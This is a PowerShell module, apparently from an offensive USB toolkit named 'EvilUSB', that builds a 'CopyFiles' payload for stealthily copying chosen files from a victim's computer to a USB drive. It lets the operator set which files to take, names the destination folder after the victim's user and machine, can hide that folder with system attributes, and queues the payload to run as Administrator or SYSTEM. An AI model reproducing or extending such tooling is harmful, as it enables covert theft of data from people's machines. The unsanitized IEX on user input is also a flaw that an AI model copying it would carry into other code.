Function Main {
	$PayloadInfo = New-Object PSObject -Property @{
		Name = 'CopyFiles'
		Author = '@H3ll0World'
		Description = 'Copy Files stealthily to USB'
		Link = ''
		'System Required' = 'False'
	}
	$ShowInfo = {
		$PayloadInfo | Format-List Name,Author,Description,Link,'System Required'
	}
	$Help = @{
		0 = New-Object PSObject -Property @{Command = 'Help'; Description = 'Show this menu'}
		1 = New-Object PSObject -Property @{Command = 'Options'; Description = 'Show the options for the payload'}
		2 = New-Object PSObject -Property @{Command = 'Set'; Description = 'Set an option'}
		3 = New-Object PSObject -Property @{Command = 'Add'; Description = 'Save the payload'}
		4 = New-Object PSObject -Property @{Command = 'Quit'; Description = 'Quit the payload'}
		5 = New-Object PSObject -Property @{Command = 'Info'; Description = 'Show information about the payload'}
		6 = New-Object PSObject -Property @{Command = 'Cls'; Description = 'Clear the screen'}
	}
	$HelpAliases = @{
		0 = New-Object PSObject -Property @{Alias = '?,-?,/?'; Description = 'Alias for Help'}
		1 = New-Object PSObject -Property @{Alias = 'Save'; Description = 'Alias for Add'}
		2 = New-Object PSObject -Property @{Alias = 'Show'; Description = 'Alias for Options'}
		3 = New-Object PSObject -Property @{Alias = 'Exit'; Description = 'Alias for Quit'}
		4 = New-Object PSObject -Property @{Alias = 'Back'; Description = 'Alias for Quit'}
		5 = New-Object PSObject -Property @{Alias = 'Main'; Description = 'Alias for Quit'}
	}
	$Options = @{
		'Files' = New-Object PSObject -Property @{
			'Name' = "Files"
			'Description' = "Files to copy"
			'Required' = "True"
			'Value' = ''
		}
		'DestinationFolder' = New-Object PSObject -Property @{
			'Name' = "DestinationFolder"
			'Description' = "Path to destination folder"
			'Required' = "True"
			'Value' = 'Files-$([Environment]::UserName)@$([Environment]::MachineName)'
		}
		'Hide' = New-Object PSObject -Property @{
			'Name' = "Hide"
			'Description' = "Hide the folder with the copied files"
			'Required' = "False"
			'Value' = $false
		}
	}

	# Show the info of the module
	$ShowInfo.Invoke()
	
	While ($true) {
		Write-Host "($($LANG[0]): " -NoNewLine
		Write-Host $PayloadInfo.Name -NoNewline -ForegroundColor Red
		Write-Host ') > ' -NoNewLine
		$Opc = Read-Host
		if ($Opc) {
			if ($Opc.Split(' ')[0] -eq 'Set') {
				if ($Opc.Split(' ').Length -ge 3) {
					$Option = $Opc.Split(' ')[1]
					if ($Options.$Option) {
						$Value = $Opc.Remove(0,5 + $Option.Length)
						IEX ('$Options.' + $Option + '.Value = "' + $Value + '"')
					}
				} else {
					
				}
			} elseif (('Help', '?', '-?', '/?') -eq $Opc.Split(' ')[0]) {
				# Print Help Menu
				$Help.Values | Sort-Object -Property Command,Description | Out-Host
				# Print Aliases Menu
				$HelpAliases.Values | Select Alias,Description | Sort-Object -Property Alias | Out-Host
			} elseif ( ('Options','Show') -eq $Opc.Split(' ')[0] ) {
				# Show Options
				## Format
				$Format = @{Expression={$_.Name}; Label = "Name"; Width = 12; Alignment = "Left"},
						  @{Expression={$_.Required[0].ToString().ToUpper() + ($_.Required[1..$_.Required.length] -Join '').ToLower()}; Label = "Required"; Width = 8; Alignment = "Left"},
						  @{Expression={if ($_.Value.length -lt 61){$_.Value}else{$_.Value.Remove(58) + '...'}}; Label = "Value"; Alignment = "Left"},
						  @{Expression={$_.Description}; Label = "Description"; Width = 35; Alignment = "Left"}
				## Show Options in Table Format
				$Options.Values | Sort-Object -Property Name | Format-Table $Format | Out-Host
			} elseif ( ('Save','Add') -eq $Opc.Split(' ')[0] ) {
				$Ready = $true
				foreach ($Option in $Options.Keys)
				{
					if ($Options.($Option).Required -eq 'True' -and $Options.($Option).Value -eq '')
					{
						Write-Host -ForegroundColor Red Value required for option: $Option
						$Ready = $false
					}
				}
				if ($Ready)
				{
					EvilUSB:Print 0 $LANG[28]
					Add-Payload
					return
				}
			} elseif ( ('Exit', 'Quit', 'Back', 'Main') -eq $Opc.Split(' ')[0] ) {
				EvilUSB:Print 0 $LANG[29]
				return
			} elseif ($Opc.Split(' ')[0] -eq'Info') {
				$ShowInfo.Invoke()
			} elseif ($Opc.Split(' ')[0] -eq'Cls') {
				Clear-Host
			} else {
				EvilUSB:Print 1 $LANG[30]
				EvilUSB:Print 0 $LANG[31]
			}
		}
		#Sleep -Mil 100
	}
}

Function Add-Payload {
	$ModuleSource = Get-Content "$PWD\data\payload_source\CopyFiles.ps1" | Out-String
	
	$ModuleSource = $ModuleSource.Replace('#Destination', $Options.DestinationFolder.Value)

	$Paths = ''
	foreach ($Path in $Options.Files.Value.Split(';'))
	{
		$NewPath = '@{Path="' + $Path.Split(',')[0] + '";'
		$NewPath += 'Extensions="' + ($Path.Split(',')[1].Split(' ') -join ' ') + '";'
		$NewPath += 'Recurse=' + $(if ($Path.Split(',')[2] -eq '1') {'$True'} else {'$False'}) + "};"

		$Paths += $NewPath
	}

	$ModuleSource = $ModuleSource.Replace('#Paths', $Paths)
	
	if ($Options.Hide.Value -or $Options.Hide.Value -eq "true")
	{
		$Command = 'Set-Location ..;'
		$Command += 'Set-ItemProperty "' + $Options.DestinationFolder.Value + '" -Name Attributes -Value "ReadOnly, Hidden, System";'
		EvilUSB:Print 0 "Use 'attrib /s /d -s -r -h <file_path>' to unhide the destination folder."
	}
	
	# Finally, you need to put he payload code into the '$PayloadCode' variable, which will be added to the stack of payloads
	$PayloadCode = $ModuleSource + $Command
		
	$PayloadToAdd = New-Object PSCustomObject -Property @{
		Code = $PayloadCode
		User = if ($PayloadInfo.'System Required' -eq 'True') {'SYSTEM'} else {'Administrator'}
	}
	try {
		$Global:PayloadsToWrite.Add($PayloadInfo.Name, $PayloadToAdd)
	} catch [ArgumentException] {
		EvilUSB:Print 1 $LANG[32]
		#$error[0]
	}
}

Main